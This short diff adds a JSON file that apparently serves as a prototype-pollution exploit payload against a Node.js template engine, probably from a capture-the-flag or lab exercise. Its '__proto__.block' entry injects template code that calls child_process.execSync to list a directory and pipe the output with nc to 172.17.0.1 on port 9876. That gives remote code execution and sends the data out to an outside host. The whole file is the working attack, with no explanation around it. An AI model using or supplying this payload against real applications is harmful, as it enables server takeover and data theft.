@@ -1,0 +1,7 @@
+{
+    "artist.name":"Westaway",
+    "__proto__.block": {
+        "type": "Text", 
+        "line": "process.mainModule.require('child_process').execSync(`ls -lah | nc -w 3 172.17.0.1 9876`)"
+    }
+}
